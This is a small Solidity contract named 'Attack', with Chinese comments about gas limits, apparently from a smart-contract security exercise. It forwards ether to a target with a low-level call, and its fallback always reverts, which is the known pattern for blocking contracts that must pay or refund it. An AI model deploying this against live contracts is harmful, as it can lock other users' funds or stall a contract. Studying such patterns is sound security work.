// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{

        event Init(string,address);
     constructor() public{
         emit Init("Init2 ok",msg.sender);
     }

    function attackGO(address  payable add) public payable{
        //add.transfer(msg.value);//transfer gas限制2300 不够
        //add.call.value(msg.value)(); //8版本之前写法
        add.call{value:msg.value}("");//钱包里的gas 限制需要调整高些
    }
        event Log(string,address);
    fallback() external payable{
       emit Log("attack in fallback2",msg.sender);
       revert();
    }
}